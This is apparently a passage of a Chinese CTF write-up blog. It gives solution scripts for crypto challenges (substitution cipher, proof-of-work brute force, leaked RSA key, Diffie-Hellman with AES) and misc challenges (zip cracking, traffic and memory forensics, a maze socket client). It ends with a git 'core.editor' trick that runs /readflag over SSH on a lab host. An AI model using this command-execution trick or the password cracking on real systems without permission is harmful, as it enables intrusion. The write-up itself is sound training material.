+xo e gqeyj bqhfom fdg fso skqgq jfdolexoi skxirqgqm iqpgqli lf lkq gxvqgi eom lgqqi kdjjqm ydyyebxqi qvqgh mdiu lkqgq sei e veyyqh ikgfdmqm xo e gemxeol ayfs lkxi sei lkq pghiley veyyqh
+
+lkq gqeifo nfg xli oejq sei pyqeg lf eoh seomqgqg skf kerrqoqm drfo lkxi jeaxpey ryepq lkq agfdom sei revqm sxlk aqjilfoqi lgqqi kem yqevqi fn qjqgeym eom nyfsqgi ikxjjqgqm sxlk ierrkxgq rqleyi lkq gxvqg nyfsqm sxlk e iqgqoq ixyvqgh yxakl xyydjxoelxoa lkq qolxgq veyyqh
+
+bdl lkq jfil jeaoxnxpqol ixakl sei el lkq pqolqg fn lkq veyyqh e lgqq ageomqg lkeo eoh flkqg sxlk bgeopkqi ilgqlpkxoa fdl sxmq lfdpkxoa lkq iuxqi lkxi sei lkq pghiley lgqq xli begu jemq fn mxejfom eom xli ngdxl e pghiley erryq kqym lkq pfjbxoqm sximfj fn lkq sfgym
+
+yqaqom lfym fn xli jeaxp skfqvqg leilqm lkq erryq sfdym aexo e mqqr domqgileomxoa fn lkq doxvqgiq bdl el e rgxpq lkq lgqq sfdym foyh bqeg foq ngdxl qvqgh pqoldgh eom fopq rxpuqm lkq veyyqh sfdym bq ikgfdmqm xo meguoqii nfg lkq oqzl kdomgqm hqegi
+
+foq meh e hfdoa axgy oejqm qyege adxmqm bh lkq skxirqgi fn lkq sxom nfdom kqg seh lf lkq pghiley veyyqh jqijqgxcqm bh lkq bqedlh ikq sei lqjrlqm bh lkq yqaqom fn lkq pghiley lgqq ei ikq errgfepkqm xl lkq lgqq irfuq iqquqg fn sximfj mf hfd sxik lf pyexj lkq pghiley erryq”
+
+“x mf” qyege gqryxqm kqg vfxpq lgqjbyxoa bdl x nqeg lkq meguoqii xl sfdym bgxoa
+
+lkq lgqq gqirfomqm lkq meguoqii xi e pfoiqwdqopq bdl ofl e rdoxikjqol qvqgh yxakl peili e ikemfs sximfj bgxoai sxlk xl lkq bdgmqo fn uofsxoa
+
+aelkqgxoa kqg pfdgeaq qyege pkfiq ofl lf leuq lkq erryq xoilqem ikq mqpxmqm lf ixl bqoqelk lkq lgqq yqllxoa xli ikxjjqgxoa yxakl meopq egfdom kqg mehi ldgoqm xolf oxakli eom oxakli xolf mehi sxlk qepk reiixoa jfjqol qyege nqyl e pfooqplxfo lf lkq sfgym egfdom kqg domqgileomxoa xl xo sehi ikq oqvqg xjeaxoqm
+
+foq jfgoxoa ei lkq nxgil gehi fn meso uxiiqm lkq veyyqh lkq pghiley lgqq bfgq e oqs ngdxl xl sei of yfoaqg e pghiley erryq bdl e gemxeol kqegl ikxjjqgxoa sxlk pfyfgi lkel kem oqvqg bqqo iqqo bqnfgq
+
+hfdg kqegl eom hfdg pkfxpq kevq lgeoinfgjqm lkq axnl skxirqgqm lkq lgqq sxlk yfvq eom relxqopq hfd kevq nfdom sximfj lkq kqegl kfymi lkq bqedlh fn domqgileomxoa sxlkfdl peilxoa e ikemfs
+
+qyege sxlk lqegi fn tfh kqym lkq kqegl pyfiq ikq gqeyxcqm lkel ifjqlxjqi sximfj xio’l ebfdl leuxoa bdl ebfdl axvxoa ofl ebfdl uofsxoa qvqghlkxoa bdl domqgileomxoa lkq veydq fn qvqghlkxoa
+
+eom if lkq yqaqom fn lkq pghiley veyyqh qvfyvqm lqyyxoa leyqi ofl fn e pghiley erryq bdl fn e gemxeol kqegl eom e hfdoa axgy skf pkfiq lf domqgileom lkq sfgym sxlk yfvq
+
+lkq veyyqh pfolxodqm lf ayfs bgxaklqg lkeo qvqg sqypfjxoa seomqgqgi sxlk xli aqolyq qjbgepq eom gqjxomxoa lkqj lkel ifjqlxjqi lkq tfdgoqh eom lkq pkfxpqi jemq eyfoa lkq seh egq jfgq gqsegmxoa lkeo lkq mqilxoelxfo xliqyn
+&quot;&quot;&quot;
+
+# 移除空格和换行符
+ciphertext = ciphertext.replace(&quot; &quot;, &quot;&quot;).replace(&quot;\n&quot;, &quot;&quot;)
+
+# 计算每个字符的频率
+frequency = Counter(ciphertext)
+
+# 打印结果
+for char, freq in frequency.most_common():
+    print(f&quot;{char}: {freq}&quot;)
+
+</code></pre>
+<p>q出现频率最大 分析可能映射e</p>
+<p><code>lkq</code> 对应 <code>the</code></p>
+<p>手动推理得</p>
+<p><code>abcdefghijklmnopqrstuvwxyz</code></p>
+<p><code>gbzuaorysmhtdfncepwhkvqilx</code></p>
+<p>编写脚本解密</p>
+<pre><code class="language-python"># 原始字母表
+original_alphabet = &quot;gbzuaorysmhtdfncepwhkvqilx&quot;
+
+# 提供的密钥映射
+encryption_key = &quot;abcdefghijklmnopqrstuvwxyz&quot;
+
+# 反向映射，用于解密
+decryption_key = {encryption_key[i]: original_alphabet[i] for i in range(len(original_alphabet))}
+
+# 解密函数
+def decrypt(ciphertext):
+    # 将密文转换为小写
+    ciphertext = ciphertext.lower()
+    # 解密过程
+    plaintext = ''.join(decryption_key.get(letter, letter) for letter in ciphertext)
+    return plaintext
+
+# 示例密文，你可以用实际的密文替换这里
+ciphertext = &quot;&quot;&quot;
+lkq pghiley veyyqh eom lkq nyea xi sqypfjq lf fzne 
+
+xo e gqeyj bqhfom fdg fso skqgq jfdolexoi skxirqgqm iqpgqli lf lkq gxvqgi eom lgqqi kdjjqm ydyyebxqi qvqgh mdiu lkqgq sei e veyyqh ikgfdmqm xo e gemxeol ayfs lkxi sei lkq pghiley veyyqh
+
+lkq gqeifo nfg xli oejq sei pyqeg lf eoh seomqgqg skf kerrqoqm drfo lkxi jeaxpey ryepq lkq agfdom sei revqm sxlk aqjilfoqi lgqqi kem yqevqi fn qjqgeym eom nyfsqgi ikxjjqgqm sxlk ierrkxgq rqleyi lkq gxvqg nyfsqm sxlk e iqgqoq ixyvqgh yxakl xyydjxoelxoa lkq qolxgq veyyqh
+
+bdl lkq jfil jeaoxnxpqol ixakl sei el lkq pqolqg fn lkq veyyqh e lgqq ageomqg lkeo eoh flkqg sxlk bgeopkqi ilgqlpkxoa fdl sxmq lfdpkxoa lkq iuxqi lkxi sei lkq pghiley lgqq xli begu jemq fn mxejfom eom xli ngdxl e pghiley erryq kqym lkq pfjbxoqm sximfj fn lkq sfgym
+
+yqaqom lfym fn xli jeaxp skfqvqg leilqm lkq erryq sfdym aexo e mqqr domqgileomxoa fn lkq doxvqgiq bdl el e rgxpq lkq lgqq sfdym foyh bqeg foq ngdxl qvqgh pqoldgh eom fopq rxpuqm lkq veyyqh sfdym bq ikgfdmqm xo meguoqii nfg lkq oqzl kdomgqm hqegi
+
+foq meh e hfdoa axgy oejqm qyege adxmqm bh lkq skxirqgi fn lkq sxom nfdom kqg seh lf lkq pghiley veyyqh jqijqgxcqm bh lkq bqedlh ikq sei lqjrlqm bh lkq yqaqom fn lkq pghiley lgqq ei ikq errgfepkqm xl lkq lgqq irfuq iqquqg fn sximfj mf hfd sxik lf pyexj lkq pghiley erryq”
+
+“x mf” qyege gqryxqm kqg vfxpq lgqjbyxoa bdl x nqeg lkq meguoqii xl sfdym bgxoa
+
+lkq lgqq gqirfomqm lkq meguoqii xi e pfoiqwdqopq bdl ofl e rdoxikjqol qvqgh yxakl peili e ikemfs sximfj bgxoai sxlk xl lkq bdgmqo fn uofsxoa
+
+aelkqgxoa kqg pfdgeaq qyege pkfiq ofl lf leuq lkq erryq xoilqem ikq mqpxmqm lf ixl bqoqelk lkq lgqq yqllxoa xli ikxjjqgxoa yxakl meopq egfdom kqg mehi ldgoqm xolf oxakli eom oxakli xolf mehi sxlk qepk reiixoa jfjqol qyege nqyl e pfooqplxfo lf lkq sfgym egfdom kqg domqgileomxoa xl xo sehi ikq oqvqg xjeaxoqm
+
+foq jfgoxoa ei lkq nxgil gehi fn meso uxiiqm lkq veyyqh lkq pghiley lgqq bfgq e oqs ngdxl xl sei of yfoaqg e pghiley erryq bdl e gemxeol kqegl ikxjjqgxoa sxlk pfyfgi lkel kem oqvqg bqqo iqqo bqnfgq
+
+hfdg kqegl eom hfdg pkfxpq kevq lgeoinfgjqm lkq axnl skxirqgqm lkq lgqq sxlk yfvq eom relxqopq hfd kevq nfdom sximfj lkq kqegl kfymi lkq bqedlh fn domqgileomxoa sxlkfdl peilxoa e ikemfs
+
+qyege sxlk lqegi fn tfh kqym lkq kqegl pyfiq ikq gqeyxcqm lkel ifjqlxjqi sximfj xio’l ebfdl leuxoa bdl ebfdl axvxoa ofl ebfdl uofsxoa qvqghlkxoa bdl domqgileomxoa lkq veydq fn qvqghlkxoa
+
+eom if lkq yqaqom fn lkq pghiley veyyqh qvfyvqm lqyyxoa leyqi ofl fn e pghiley erryq bdl fn e gemxeol kqegl eom e hfdoa axgy skf pkfiq lf domqgileom lkq sfgym sxlk yfvq
+
+lkq veyyqh pfolxodqm lf ayfs bgxaklqg lkeo qvqg sqypfjxoa seomqgqgi sxlk xli aqolyq qjbgepq eom gqjxomxoa lkqj lkel ifjqlxjqi lkq tfdgoqh eom lkq pkfxpqi jemq eyfoa lkq seh egq jfgq gqsegmxoa lkeo lkq mqilxoelxfo xliqyn
+&quot;&quot;&quot;
+
+# 调用解密函数并打印解密后的文本
+plaintext = decrypt(ciphertext)
+print(&quot;解密后的文本:&quot;, plaintext)
+
+</code></pre>
+<h2 id="easy_pow">easy_pow</h2>
+<p>flag:Redrock{b9e71b71-bf9c-40e4-8bbe-48e86bbf7709}</p>
+<pre><code class="language-python">import itertools
+import hashlib
+import string
+
+# 给定的哈希值和字符串
+given_hash = &quot;178245ac32d894cfbcd1863c662d1fb161cd6ee96b655321b4fa7f251ef0db7b&quot;
+given_string = &quot;jlzOSXOuy1ec1Tb7&quot;
+
+# 字符集，由于是4个字符，所以我们可以假设它是可打印的ASCII字符
+charset = string.ascii_letters + string.digits
+
+# 穷举所有可能的4个字符的组合
+for combo in itertools.product(charset, repeat=4):
+    # 将字符元组转换为字符串
+    test_str = ''.join(combo)
+    # 计算当前测试字符串的哈希值
+    test_hash = hashlib.sha256(test_str.encode() + given_string.encode()).hexdigest()
+    # 如果测试哈希值与给定的哈希值匹配，我们找到了答案
+    if test_hash == given_hash:
+        print(f&quot;找到了XXXX的值：{test_str}&quot;)
+        break
+
+</code></pre>
+<h2 id="leak_d">leak_d</h2>
+<p>flag:Redrock{02d6e0c4-bd4f-45e6-8c13-5e25ab0461bf}</p>
+<pre><code class="language-python"># 给定的N, C和D
+n = 
+c = 
+d = 
+
+# 解密密文
+plaintext = pow(c, d, n)
+
+# 将明文转换为字节
+plaintext_bytes = plaintext.to_bytes((plaintext.bit_length() + 7) // 8, 'big')
+
+# 尝试解码明文（如果它是一个UTF-8编码的文本消息）
+try:
+    decoded_plaintext = plaintext_bytes.decode('utf-8')
+    print(&quot;Decoded plaintext:&quot;, decoded_plaintext)
+except UnicodeDecodeError:
+    print(&quot;The decrypted plaintext is not a valid UTF-8 string.&quot;)
+
+</code></pre>
+<h2 id="easy_dhke">easy_dhke</h2>
+<p>flag:0xFA{DHKE_is_a_simple_Discrete_logarithm_Problem}</p>
+<p>分析服务端代码</p>
+<p>-<code>p</code> 是一个大的素数，用作DHKE中的模。<br>
+- <code>g</code> 是基数，用于生成DHKE中的公钥。<br>
+- <code>alice</code> 是Alice的私钥，一个由Alice选择的整数。<br>
+- <code>bob</code> 是Bob的私钥，一个由Bob选择的整数。<br>
+- <code>Bob</code> 是Bob计算的公钥，等于 <code>g^bob mod p</code>。<br>
+- <code>key</code> 是由Alice计算的共享密钥，等于 <code>Bob^alice mod p</code> 转换为字节。</p>
+<p>- 服务器端生成一个20个字符的随机字符串作为<code>secret</code>。<br>
+- 服务器端使用共享密钥对<code>secret</code>加密，并将密文发给客户端。<br>
+- 客户端需要解密消息，并将原始的<code>secret</code>发送回服务器。<br>
+- 如果客户端成功返回<code>secret</code>，服务器要求客户端使用共享密钥加密字符串&quot;HackedBy0xfa&quot;并将其发回。</p>
+<p>使用脚本解决</p>
+<p>首先计算key</p>
+<pre><code class="language-python">from Crypto.Util.number import *  # type: ignore
+import socketserver
+import signal
+import string
+import random
+import os
+p = 327824197795087630552811243153730025469
+g = 5
+alice = 22751
+bob = 39494
+Bob = pow(g, bob, p)
+key = long_to_bytes(pow(Bob, alice, p))
+print(key)
+</code></pre>
+<p><code>key = \xde\x97\x9d\x83\xceh\x90\xc9\xe94\x0eH^\x07\xde</code></p>
+<p>然后是解密</p>
+<pre><code class="language-python">from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+key =b'\xde\x97\x9d`\x83\xceh\x90\xc9\xe94\x0eH^\x07\xde'
+encrypted_message =b''
+
+cipher = AES.new(key, AES.MODE_ECB)
+
+text = unpad(cipher.decrypt(encrypted_message), AES.block_size)
+
+print(text.decode('utf-8'))
+</code></pre>
+<p>最后是加密</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+
+shared_key = b'\xde\x97\x9d`\x83\xceh\x90\xc9\xe94\x0eH^\x07\xde'
+
+plain_text = b&quot;'HackedBy0xfa'&quot;
+
+cipher = AES.new(shared_key, AES.MODE_ECB)
+
+message = cipher.encrypt(pad(plain_text, AES.block_size))
+print(message)
+</code></pre>
+<h1 id="miscak"><strong>MISC（AK）</strong></h1>
+<h2 id="easy_qrcode">easy_qrcode</h2>
+<p>flag:0xFA{It's_really_easy}</p>
+<p>得到四张碎片图片，用PS拼接后扫描</p>
+<h2 id="easy_traffic">easy_traffic</h2>
+<p>flag:0xFA{Try_to_cAtCh_oceaner}</p>
+<p>WireShark导出http对象，发现flag.txt，然后追踪TCP流</p>
+<h2 id="easy_unpack">easy_unpack</h2>
+<p>flag:0xFA{0nly_oceaner_Can_dec0mPress}</p>
+<p>压缩包套娃，使用py脚本破解</p>
+<pre><code class="language-python">import zipfile
+import os
+
+# 设定包含unpack.zip的目录路径
+base_path = 'D:/桌面/新建文件夹/'
+
+def flag(number):
+    try:
+        # 根据提供的数字构造新的zip文件的名称
+        zipname = 'flag' + str(number) + '.zip'
+
+        # 设定完整的unpack.zip路径和新的zip文件路径
+        original_zip_path = os.path.join(base_path, 'unpack.zip')
+        new_zip_path = os.path.join(base_path, zipname)
+
+        # 重命名unpack.zip到新的文件名
+        os.rename(original_zip_path, new_zip_path)
+
+        # 使用新的文件路径来打开zip文件
+        zfile = zipfile.ZipFile(new_zip_path, 'r')
+        print(zfile)
+        # 解压缩到指定的目录
+        zfile.extractall(path=base_path)
+        zfile.close()
+    except FileNotFoundError:
+        print(&quot;未找到文件，请检查路径。&quot;)
+    except zipfile.BadZipFile:
+        print(&quot;文件不是压缩文件或压缩文件已损坏。&quot;)
+    except Exception as e:
+        print(f&quot;发生错误：{e}&quot;)
+
+# 尝试解压缩1000个可能的zip文件
+for i in range(0, 1000):  # 数值可以做调整
+    flag(i)
+</code></pre>
+<h2 id="easy_wordle">easy_wordle</h2>
+<p>flag:Redrock{de8f0caf-65ce-4770-bfc3-f3f59afebe24}</p>
+<p>猜单词游戏，nc靶机交互后用此脚本破解</p>
+<pre><code class="language-python">def update_word_list(word_list, guess, feedback):
+    new_word_list = []
+    feedback_list = feedback.split()
+    
+    for word in word_list:
+        if len(word) != len(feedback_list):
+            continue
+
+        match = True
+        for i, (g_letter, f) in enumerate(zip(guess, feedback_list)):
+            if f == '绿' and word[i] != g_letter:
+                match = False
+                break
+            elif f == '黄' and (g_letter not in word or word[i] == g_letter):
+                match = False
+                break
+            elif f == '灰' and g_letter in word:
+                match = False
+                break
+
+        if match:
+            new_word_list.append(word)
+
+    return new_word_list
+
+# 加载单词列表
+def load_word_list(filename):
+    with open(filename, 'r') as file:
+        return [line.strip() for line in file.readlines()]
+
+# 主函数，控制游戏逻辑
+def main():
+    word_list_filename = 'D:\\Download\\Firefox Download\\wordlist.txt'  # 你的单词列表文件路径
+    word_list = load_word_list(word_list_filename)
+
+    attempts = 6
+    while attempts &gt; 0 and len(word_list) &gt; 1:
+        print(f&quot;\n剩余单词数量: {len(word_list)}&quot;)
+        guess = input(f&quot;请输入第 {7 - attempts} 次猜测的单词: &quot;).strip().lower()
+        feedback = input(&quot;请输入单词的反馈 (使用 绿 黄 灰 来表示): &quot;).strip().lower()
+
+        word_list = update_word_list(word_list, guess, feedback)
+        print(&quot;可能的单词列表: &quot;, word_list)
+        attempts -= 1
+
+    if len(word_list) == 1:
+        print(f&quot;\n可能的单词是: {word_list[0]}&quot;)
+    else:
+        print(&quot;\n未能准确找到单词。需要更多的反馈。&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+
+</code></pre>
+<h2 id="easy_zip">easy_zip</h2>
+<p>flag:0xFA{Passw0rd_is_123456}</p>
+<p>压缩包爆破得到密码<code>123456</code></p>
+<h2 id="神秘的声音">神秘的声音</h2>
+<p>flag:redrock{MSSTV}</p>
+<p>与<code>来自外星的信号</code>题类似，听过一遍就能知道用<code>MMSSTV</code></p>
+<h2 id="哪里难了">哪里难了？</h2>
+<p>flag:redrock{we1c0me t0 CTF w0rld}</p>
+<p>docx隐藏文字，打开显示隐藏文字选项，然后用base32解码，最后用凯撒密码枚举破解</p>
+<h2 id="checkin">CheckIn</h2>
+<p>flag:Redrock{Cyber_security_is_for_the_people_and_cyber_security_depends_on_the_people}</p>
+<p>关注公众号获取</p>
+<h2 id="问卷调查">问卷调查</h2>
+<p>flag:Redrock{Hacking_For_Fun 😃}</p>
+<p>填写问卷获取</p>
+<h2 id="yyz想要回到过去">yyz想要回到过去</h2>
+<p>flag:redrock{Z3tmZm00dmFwcG04NHZhYDRte2FmNHVmcTR9ejQxZx5ne2ZmbTR2YXBwbTg0dm}</p>
+<p>cmd命令行中运行此程序，提示时间不对</p>
+<p>结合题目描述和静态分析，将系统时间改为2019年再启动即可</p>
+<h2 id="海燕的秘密">海燕的秘密</h2>
+<p>flag:redrock{grEa1e_y0u_Kn0w_h0w_t0_uSe_21p}</p>
+<p>第一层加密：暴力破解压缩包</p>
+<p>第二层加密：根据附带字典破解</p>
+<p>第三层加密：根据压缩包中含有已知文件，明文破解</p>
+<p>破解后是一张图片，010Editor查看后发现PK字样，使用<code>binwalk</code>或<code>foremost</code>提取文件得到flag图片</p>
+<h2 id="easy_maze">easy_maze</h2>
+<p>flag:Redrock{d25d6a5e-0e5a-447e-967f-4d6b1a782348}</p>
+<p>迷宫题，编写递归py脚本与靶机交互</p>
+<pre><code class="language-python">import socket
+import time
+
+class MazeSolver:
+    def __init__(self, host, port):
+        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.client_socket.connect((host, port))
+        self.visited = set()  # 用于记录访问过的位置
+        self.backtrack = {'w': 's', 's': 'w', 'a': 'd', 'd': 'a'}  # 用于回溯的方向映射
+
+    def send_data(self, data):
+        print(f&quot;Sending: {data}&quot;)
+        self.client_socket.sendall(data.encode() + b'\n')
+        time.sleep(0.5)  # 延时以确保不会发送太快
+
+    def receive_data(self):
+        response = self.client_socket.recv(2048)  # 假设每次响应不会超过2048字节
+        if not response:
+            return None
+        return response.decode()
+
+    def solve_maze(self, position=(0, 0), move=''):
+        if move:
+            self.send_data(move)
+            response = self.receive_data()
+            if response is None:
+                return False
+
+            print(f&quot;Response for move {move}: {response.strip()}&quot;)
+
+            if &quot;bumped into the wall&quot; in response:
+                return False
+            if &quot;exit&quot; in response.lower():
+                print(&quot;Found the exit!&quot;)
+                return True
+        else:
+            print(&quot;Starting at the maze entrance&quot;)
+
+        self.visited.add(position)
+
+        # 假设迷宫只有上下左右四个方向
+        directions = {'w': (-1, 0), 's': (1, 0), 'a': (0, -1), 'd': (0, 1)}
+        for direction, (dx, dy) in directions.items():
+            new_position = (position[0] + dx, position[1] + dy)
+            if new_position not in self.visited:
+                if self.solve_maze(new_position, direction):
+                    return True
+
+        # 回溯
+        if move:
+            backtrack_move = self.backtrack[move]
+            self.send_data(backtrack_move)
+            self.receive_data()
+
+        return False
+
+    def close_connection(self):
+        self.client_socket.close()
+
+
+# Replace 'localhost' and 12345 with the actual host and port
+host = '172.20.14.117'
+port = 39727
+solver = MazeSolver(host, port)
+
+try:
+    if solver.solve_maze():
+        print(&quot;Maze solved successfully!&quot;)
+    else:
+        print(&quot;Failed to solve the maze.&quot;)
+finally:
+    solver.close_connection()
+
+</code></pre>
+<h2 id="3g之前是什么">3G之前是什么</h2>
+<p>flag:Redrock{0f69340f-403c-404e-85c9-476d31870e47}</p>
+<p>概率论， 最简单的方法就是直接问。胜率高达<code>99.9%</code></p>
+<pre><code>betacat@betacat-virtual-machine:~$ nc 172.20.14.117 35218
+The Unbreakable Shannon has returned, with some suspicious chests and a far more complicated strategy -- he MAY LIE ONCE OR TWICE! Can you still get all the treasure without losing your head?
+Seven chests lie here, with mimics or treasure hidden inside.
+But don't worry. Trusty Shannon knows what to do.
+Ask Shannon:
+[-] C0
+Shannon answers: True!
+
+Ask Shannon:
+[-] C0
+Shannon answers: True!
+
+Ask Shannon:
+[-] C1
+Shannon answers: True!
+
+Ask Shannon:
+[-] C1
+Shannon answers: False!
+
+Ask Shannon:
+[-] C1
+Shannon answers: False!
+
+Ask Shannon:
+[-] C2
+Shannon answers: False!
+
+Ask Shannon:
+[-] C3
+Shannon answers: True!
+
+Ask Shannon:
+[-] C3
+Shannon answers: False!
+
+Ask Shannon:
+[-] C3
+Shannon answers: True!
+
+Ask Shannon:
+[-] C4
+Shannon answers: True!
+
+Ask Shannon:
+[-] C5
+Shannon answers: False!
+
+Ask Shannon:
+[-] C6
+Shannon answers: False!
+
+Ask Shannon:
+[-] C6
+Shannon answers: False!
+
+Ask Shannon:
+[-] C6
+Shannon answers: False!
+
+Ask Shannon:
+[-] C6
+Shannon answers: False!
+
+Now open the chests:
+[-] 1 0 0 1 1 0 0
+You've found all the treasure! b'Redrock{0f69340f-403c-404e-85c9-476d31870e47}'
+</code></pre>
+<h2 id="内存取证">内存取证</h2>
+<p>flag:flag{pbDTKxxUMKoXP9Ah}</p>
+<p>使用volatility工具分析</p>
+<p><code>python3 vol.py -f data.vmem windows.pstree</code></p>
+<p>列出进程发现后门程序 <code>backdoor.exe</code> PID为<code>2920</code></p>
+<p>将它的映像提取出来</p>
+<p><code>python3 vol.py -f data.vmem windows.dumpfiles</code></p>
+<p>在010editor中查看 <code>file.0xbe810c8473f0.0xbe810b970660.ImageSectionObject.backdoor.exe</code></p>
+<p>得到flag</p>
+<h2 id="大雪树锯结构">大雪树锯结构</h2>
+<p>flag:Redrock{7ee3dc66-df21-4419-bfd9-e31287ac1833}</p>
+<p>使用 <code>git</code> 相关命令检查发现的 Git 仓库目录结构，确认是 Git 仓库</p>
+<p>发现了 <code>data-structure.git</code> 目录，确认它是一个裸仓库</p>
+<p>尝试了多种 Git 命令和配置，比如 <code>core.pager</code> 和 <code>core.editor</code>，来尝试执行 <code>/readflag</code>。</p>
+<p>根据提示，我们不需要关心 Git 仓库中的内容，关键是要利用 Git 的机制调用 <code>/readflag</code>。</p>
+<p>通过尝试不同的命令参数组合，来查找 Git 在何种情况下会调用 <code>core.editor</code>。</p>
+<p>最终，使用 <code>git commit --allow-empty</code> 命令结合 <code>-c core.editor=/readflag</code> 成功触发了 <code>/readflag</code> 程序的执行。</p>
+<p>这个命令通过创建一个空提交的方式，迫使 Git 调用配置为 <code>/readflag</code> 的 <code>core.editor</code>，成功地显示了 flag。</p>
+<pre><code>ssh -i id_rsa -p48227 git@172.20.14.117
+git --git-dir=/home/git/victor/data-structure.git/.git --work-tree=/home/git/victor/data-structure.git config user.email &quot;you@example.com&quot;
+git --git-dir=/home/git/victor/data-structure.git/.git --work-tree=/home/git/victor/data-structure.git config user.name &quot;Your Name&quot;
+git --git-dir=/home/git/victor/data-structure.git/.git --work-tree=/home/git/victor/data-structure.git -c core.editor=/readflag commit --allow-empty
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://betacatiz.github.io/tag/OEDu25kST/" class="tag">
+                    WP
+                  </a>
+                
+              </div>
+            
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
